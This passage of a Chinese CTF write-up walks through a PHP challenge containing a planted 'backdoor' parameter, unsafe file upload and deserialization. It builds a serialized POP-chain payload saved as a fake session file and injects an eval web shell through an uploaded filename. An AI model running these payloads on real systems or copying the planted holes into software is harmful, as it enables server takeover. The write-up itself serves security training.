class="variable">$Config</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;edit&#x27;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>] = <span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">        <span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;avatar&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$nickname</span> = <span class="variable">$param</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">        <span class="variable">$sex</span> = <span class="variable">$param</span>[<span class="string">&#x27;sex&#x27;</span>];</span><br><span class="line">        <span class="variable">$mail</span> = <span class="variable">$param</span>[<span class="string">&#x27;mail&#x27;</span>];</span><br><span class="line">        <span class="variable">$telnum</span> = <span class="variable">$param</span>[<span class="string">&#x27;telnum&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">editconf</span>(<span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span>);</span><br><span class="line">    &#125;<span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;m&#x27;</span>] === <span class="string">&#x27;reset&#x27;</span>) &#123;</span><br><span class="line">        <span class="variable">$Admin</span>-&gt;<span class="title function_ invoke__">resetconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;pls login! :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>class.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//安全获取基本信息，返回修改配置的表单</span></span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;nickname) ? <span class="variable">$Config</span>-&gt;nickname : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;sex) ? <span class="variable">$Config</span>-&gt;sex : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;mail) ? <span class="variable">$Config</span>-&gt;mail : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = (<span class="title function_ invoke__">is_string</span>(<span class="variable">$Config</span>-&gt;telnum) ? <span class="variable">$Config</span>-&gt;telnum : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;    &lt;form method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;file&quot; name=&quot;avatar&quot; &gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;nickname&quot; placeholder=&quot;nickname&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;sex&quot; placeholder=&quot;sex&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;mail&quot; placeholder=&quot;mail&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;text&quot; name=&quot;telnum&quot; placeholder=&quot;telnum&quot;/&gt;</span></span><br><span class="line"><span class="string">        &lt;input type=&quot;submit&quot; name=&quot;m&quot; value=&quot;edit&quot;/&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editconf</span>(<span class="params"><span class="variable">$avatar</span>, <span class="variable">$nickname</span>, <span class="variable">$sex</span>, <span class="variable">$mail</span>, <span class="variable">$telnum</span></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//编辑表单内容</span></span><br><span class="line">        <span class="variable">$Config</span> = <span class="variable language_">$this</span>-&gt;Config;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$Config</span>-&gt;avatar = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">upload</span>(<span class="variable">$avatar</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable">$Config</span>-&gt;sex = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/男|女/&quot;</span>, <span class="variable">$sex</span>, <span class="variable">$matches</span>) ? <span class="variable">$matches</span>[<span class="number">0</span>] : <span class="string">&quot;武装直升机&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;mail = (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.*@.*\..*/&#x27;</span>, <span class="variable">$mail</span>) ? <span class="variable">$mail</span> : <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="variable">$Config</span>-&gt;telnum = <span class="title function_ invoke__">substr</span>(<span class="variable">$telnum</span>, <span class="number">0</span>, <span class="number">11</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="variable">$Config</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$Config</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">filesize</span>(<span class="string">&quot;record.php&quot;</span>) &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            [<span class="keyword">new</span> <span class="title class_">Log</span>(<span class="variable">$Config</span>),<span class="string">&quot;log&quot;</span>]();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">resetconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//返回出厂设置</span></span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;/tmp/Config&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="string">&#x27;Tzo2OiJDb25maWciOjc6e3M6NToidW5hbWUiO3M6NToiYWRtaW4iO3M6NjoicGFzc3dkIjtzOjMyOiI1MGI5NzQ4Mjg5OTEwNDM2YmZkZDM0YmRhN2IxYzlkOSI7czo2OiJhdmF0YXIiO3M6MTA6Ii90bXAvMS5wbmciO3M6ODoibmlja25hbWUiO3M6MTU6IuWwj+eGiui9r+ezlk92TyI7czozOiJzZXgiO3M6Mzoi5aWzIjtzOjQ6Im1haWwiO3M6MTU6ImFkbWluQGFkbWluLmNvbSI7czo2OiJ0ZWxudW0iO3M6MTE6IjEyMzQ1Njc4OTAxIjt9&#x27;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;Config = <span class="string">&quot;:(&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;Config-&gt;<span class="title function_ invoke__">showconf</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;edit conf success\\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;br&gt;/&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">showconf</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;avatar&quot;</span>,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;telnum&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$show</span> = <span class="string">&quot;&lt;img src=\&quot;data:image/png;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;avatar)).<span class="string">&quot;\&quot;/&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;nickname: <span class="subst">$this</span>-&gt;nickname&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;sex: <span class="subst">$this</span>-&gt;sex&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;mail: <span class="subst">$this</span>-&gt;mail&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$show</span> .= <span class="string">&quot;telnum: <span class="subst">$this</span>-&gt;telnum&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$show</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$func</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;backdoor&#x27;</span>];</span><br><span class="line">            <span class="variable">$func</span>();<span class="comment">//:)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$Config</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = PHP_EOL.<span class="string">&#x27;$_&#x27;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&#x27; = \&#x27;&#x27;</span>.<span class="string">&quot;Edit: avatar-&gt;<span class="subst">$Config</span>-&gt;avatar, nickname-&gt;<span class="subst">$Config</span>-&gt;nickname, sex-&gt;<span class="subst">$Config</span>-&gt;sex, mail-&gt;<span class="subst">$Config</span>-&gt;mail, telnum-&gt;<span class="subst">$Config</span>-&gt;telnum&quot;</span>.<span class="string">&#x27;\&#x27;;&#x27;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;&lt;?php error_reporting(0); &quot;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;data === <span class="string">&quot;log_start()&quot;</span>)&#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;record.php&quot;</span>,<span class="string">&quot;&lt;?php error_reporting(0); &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;:O&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;record.php&#x27;</span>, <span class="variable">$this</span>-&gt;data, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这道题的思路很简单触发Log的toString方法即可，但是触发点并不是在反序列化，仔细审计一下后会发现是在序列化_sleep函数中</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;edit conf success\\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/&lt;br&gt;/&#x27;</span>,<span class="string">&#x27;\n&#x27;</span>,<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">showconf</span>());</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&quot;uname&quot;</span>,<span class="string">&quot;passwd&quot;</span>,<span class="string">&quot;avatar&quot;</span>,<span class="string">&quot;nickname&quot;</span>,<span class="string">&quot;sex&quot;</span>,<span class="string">&quot;mail&quot;</span>,<span class="string">&quot;telnum&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>序列化时会触发showconf函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">showconf</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$show</span> = <span class="string">&quot;&lt;img src=\&quot;data:image/png;base64,&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;avatar)).<span class="string">&quot;\&quot;/&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;nickname: <span class="subst">$this</span>-&gt;nickname&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;sex: <span class="subst">$this</span>-&gt;sex&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;mail: <span class="subst">$this</span>-&gt;mail&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="variable">$show</span> .= <span class="string">&quot;telnum: <span class="subst">$this</span>-&gt;telnum&lt;br&gt;&quot;</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$show</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>在file_get_contents的时候将avatar置为Log类即可触发，实现的方式也很简单，在我们的入口点会触发editconf函数，在这里面有一个upload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span>(<span class="params"><span class="variable">$avatar</span></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$path</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\.\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$avatar</span>[<span class="string">&#x27;fname&#x27;</span>]);</span><br><span class="line">       <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$path</span>,<span class="variable">$avatar</span>[<span class="string">&#x27;fdata&#x27;</span>]);</span><br><span class="line">       <span class="keyword">return</span> <span class="variable">$path</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以往tmp目录下写任意文件和任意文件内容，这时候我们只需要写一个<code>sess_boogipop</code>进去，内容是序列化字符串，就可以触发_sleep函数。POC如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Admin</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Config</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$uname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$avatar</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$telnum</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Log</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$exp</span>=<span class="keyword">new</span> <span class="title class_">Config</span>();</span><br><span class="line"><span class="variable">$sink</span>=<span class="keyword">new</span> <span class="title class_">Log</span>();</span><br><span class="line"><span class="variable">$sink</span>-&gt;data=<span class="string">&quot;log_start()&quot;</span>;</span><br><span class="line"><span class="variable">$exp</span>-&gt;avatar=<span class="variable">$sink</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$exp</span>);</span><br></pre></td></tr></table></figure>
<p>我们上传一个叫做sess_boogipop的文件，内容是</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaa|O:<span class="number">6</span>:<span class="string">&quot;Config&quot;</span>:<span class="number">7</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;uname&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;passwd&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;avatar&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Log&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;data&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;log_start()&quot;</span>;&#125;s:<span class="number">8</span>:<span class="string">&quot;nickname&quot;</span>;N;s:<span class="number">3</span>:<span class="string">&quot;sex&quot;</span>;N;s:<span class="number">4</span>:<span class="string">&quot;mail&quot;</span>;N;s:<span class="number">6</span>:<span class="string">&quot;telnum&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意我们要满足php session的格式<code>aaa|bbb</code>，题目初始密码在那一串base64里，解密后内容如下</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:6:&quot;Config&quot;:7:&#123;s:5:&quot;uname&quot;;s:5:&quot;admin&quot;;s:6:&quot;passwd&quot;;s:32:&quot;50b9748289910436bfdd34bda7b1c9d9&quot;;s:6:&quot;avatar&quot;;s:10:&quot;/tmp/1.png&quot;;s:8:&quot;nickname&quot;;s:15:&quot;小熊软糖OvO&quot;;s:3:&quot;sex&quot;;s:3:&quot;女&quot;;s:4:&quot;mail&quot;;s:15:&quot;admin@admin.com&quot;;s:6:&quot;telnum&quot;;s:11:&quot;12345678901&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>cmd5解密出来密码是<code>1q2w3e</code><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713628826312-c4c58276-eae7-420c-aad4-48dc75351cd2.png#averageHue=%23d4d2d0&clientId=uc4c304a8-8e1a-4&from=paste&height=682&id=u648c5c48&originHeight=1364&originWidth=2942&originalType=binary&ratio=2&rotation=0&showTitle=false&size=765825&status=done&style=none&taskId=udba580bd-266c-4a6a-bdbc-9889c0d8e43&title=&width=1471" alt="image.png"><br>然后我们上传sess_boogipop文件<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713628910216-b6b86c22-298a-416a-a643-2b4a3acb5a15.png#averageHue=%23b6c796&clientId=uc4c304a8-8e1a-4&from=paste&height=1021&id=u1b9ea8f1&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1113674&status=done&style=none&taskId=ufc717bce-9e43-4ff9-a1eb-19a6fd78b6e&title=&width=1502" alt="image.png"><br>然后我们输入<code>backdoor=session_start</code>就可以触发sleep函数，进而触发toString,记得带上<code>PHPSESSID=boogipop</code>,此时record.php已经有我们的内容了，我们可以考虑第二步往里面写shell了，这里注意生成的正常内容如下</p>
<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">$</span><span class="built_in">_</span>1713609381 = &#x27;Edit: avatar-&gt;/tmp/, nickname-&gt;aaaaa, sex-&gt;武装直升机, mail-&gt;, telnum-&gt;&#x27;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">$</span><span class="built_in">_</span>1713609389 = &#x27;Edit: avatar-&gt;/tmp/1, nickname-&gt;aaaa<span class="keyword">\&#x27;</span>, sex-&gt;武装直升机, mail-&gt;, telnum-&gt;&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>由于入口加了个waf 会对引号转义，但是没有对$_FILE的filename转义，因此在文件名可以存在逃逸。文件名为<code>1&#39;;eval($_POST[1]);#</code>即可<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713629126635-2d4724d1-26b6-4712-abcd-9380d7b3f27f.png#averageHue=%23c4d1a7&clientId=uc4c304a8-8e1a-4&from=paste&height=1021&id=ufdc1288a&originHeight=2042&originWidth=3004&originalType=binary&ratio=2&rotation=0&showTitle=false&size=1115859&status=done&style=none&taskId=ubd2a8490-f683-4bdc-ae8b-e2e61ea4248&title=&width=1502" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1713629185015-0f2709fb-6947-4617-9b88-bf7e1c030c80.png#averageHue=%23a6a6a6&clientId=uc4c304a8-8e1a-4&from=paste&height=979&id=u7969f4ae&originHeight=1958&originWidth=3192&originalType=binary&ratio=2&rotation=0&showTitle=false&size=287860&status=done&style=none&taskId=uf0c3fb76-b2dd-448c-ac59-c5e6fabdd23&title=&width=1596" alt="image.png"></p>
